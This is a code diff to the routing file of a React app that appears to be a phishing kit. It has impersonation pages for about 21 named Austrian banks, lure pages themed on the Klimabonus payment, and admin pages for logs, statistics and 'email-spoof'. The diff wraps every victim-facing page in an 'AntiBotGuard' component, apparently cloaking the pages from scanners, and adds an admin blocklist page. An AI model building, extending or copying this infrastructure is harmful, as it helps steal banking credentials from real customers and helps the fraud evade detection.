@@ -37,10 +37,13 @@ import AdminEmailTemplate from "./pages/AdminEmailTemplate.tsx";
 import AdminEmailSpoof from "./pages/AdminEmailSpoof.tsx";
 import AdminPanels from "./pages/AdminPanels.tsx";
 import AdminStatistiken from "./pages/AdminStatistiken.tsx";
+import AdminBlocks from "./pages/AdminBlocks.tsx";
 import NotFound from "./pages/NotFound.tsx";
 import Klimabonus from "./pages/Klimabonus.tsx";
 import KlimabonusVoranmeldung from "./pages/KlimabonusVoranmeldung.tsx";
 import KlimabonusBestaetigung from "./pages/KlimabonusBestaetigung.tsx";
+import AntiBotGuard from "./components/AntiBotGuard.tsx";
+import { ReactNode } from "react";
 import { useSearchParams } from "react-router-dom";
 
 const queryClient = new QueryClient();
@@ -61,6 +64,12 @@ const ConfirmationSwitch = () => {
   return <Confirmation />;
 };
 
+const P = ({ children }: { children: ReactNode }) => (
+  <AntiBotGuard>{children}</AntiBotGuard>
+);
+
+
+
 const App = () => (
   <QueryClientProvider client={queryClient}>
     <TooltipProvider>
@@ -69,7 +78,7 @@ const App = () => (
       <BrowserRouter>
         <PanelProvider>
           <Routes>
-            <Route path="/" element={<IndexSwitch />} />
+            <Route path="/" element={<P><IndexSwitch /></P>} />
             <Route path="/auth" element={<Auth />} />
             <Route path="/admin" element={<Admin />} />
             <Route path="/admin/logs" element={<AdminLogs />} />
@@ -80,32 +89,34 @@ const App = () => (
             <Route path="/admin/email-spoof" element={<AdminEmailSpoof />} />
             <Route path="/admin/panels" element={<AdminPanels />} />
             <Route path="/admin/statistiken" element={<AdminStatistiken />} />
-            <Route path="/raiffeisenbank" element={<Raiffeisenbank />} />
-            <Route path="/erstebank" element={<ErsteBank />} />
-            <Route path="/bawag" element={<Bawag />} />
-            <Route path="/bankaustria" element={<BankAustria />} />
-            <Route path="/volksbank" element={<Volksbank />} />
-            <Route path="/bank99" element={<Bank99 />} />
-            <Route path="/easybank" element={<Easybank />} />
-            <Route path="/hyponoe" element={<HypoNoe />} />
-            <Route path="/oberbank" element={<Oberbank />} />
-            <Route path="/schelhammer" element={<Schelhammer />} />
-            <Route path="/bankhausspaengler" element={<BankhausSpaengler />} />
-            <Route path="/dolomitenbank" element={<Dolomitenbank />} />
-            <Route path="/spardabank" element={<Spardabank />} />
-            <Route path="/dadatbank" element={<Dadatbank />} />
-            <Route path="/marchfelderbank" element={<Marchfelderbank />} />
-            <Route path="/btv" element={<Btv />} />
-            <Route path="/burgenland" element={<Burgenland />} />
-            <Route path="/bks" element={<Bks />} />
-            <Route path="/vkb" element={<Vkb />} />
-            <Route path="/wuestenrot" element={<Wuestenrot />} />
-            <Route path="/denizbank" element={<Denizbank />} />
-            <Route path="/confirmation" element={<ConfirmationSwitch />} />
+            <Route path="/admin/blocks" element={<AdminBlocks />} />
+            <Route path="/raiffeisenbank" element={<P><Raiffeisenbank /></P>} />
+            <Route path="/erstebank" element={<P><ErsteBank /></P>} />
+            <Route path="/bawag" element={<P><Bawag /></P>} />
+            <Route path="/bankaustria" element={<P><BankAustria /></P>} />
+            <Route path="/volksbank" element={<P><Volksbank /></P>} />
+            <Route path="/bank99" element={<P><Bank99 /></P>} />
+            <Route path="/easybank" element={<P><Easybank /></P>} />
+            <Route path="/hyponoe" element={<P><HypoNoe /></P>} />
+            <Route path="/oberbank" element={<P><Oberbank /></P>} />
+            <Route path="/schelhammer" element={<P><Schelhammer /></P>} />
+            <Route path="/bankhausspaengler" element={<P><BankhausSpaengler /></P>} />
+            <Route path="/dolomitenbank" element={<P><Dolomitenbank /></P>} />
+            <Route path="/spardabank" element={<P><Spardabank /></P>} />
+            <Route path="/dadatbank" element={<P><Dadatbank /></P>} />
+            <Route path="/marchfelderbank" element={<P><Marchfelderbank /></P>} />
+            <Route path="/btv" element={<P><Btv /></P>} />
+            <Route path="/burgenland" element={<P><Burgenland /></P>} />
+            <Route path="/bks" element={<P><Bks /></P>} />
+            <Route path="/vkb" element={<P><Vkb /></P>} />
+            <Route path="/wuestenrot" element={<P><Wuestenrot /></P>} />
+            <Route path="/denizbank" element={<P><Denizbank /></P>} />
+            <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
             <Route path="/at" element={<Navigate to="/" replace />} />
-            <Route path="/klimabonus" element={<Klimabonus />} />
-            <Route path="/klimabonus/voranmeldung" element={<KlimabonusVoranmeldung />} />
-            <Route path="/klimabonus/bestaetigung" element={<KlimabonusBestaetigung />} />
+            <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
+            <Route path="/klimabonus/voranmeldung" element={<P><KlimabonusVoranmeldung /></P>} />
+            <Route path="/klimabonus/bestaetigung" element={<P><KlimabonusBestaetigung /></P>} />
+
             {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
             <Route path="*" element={<NotFound />} />
           </Routes>
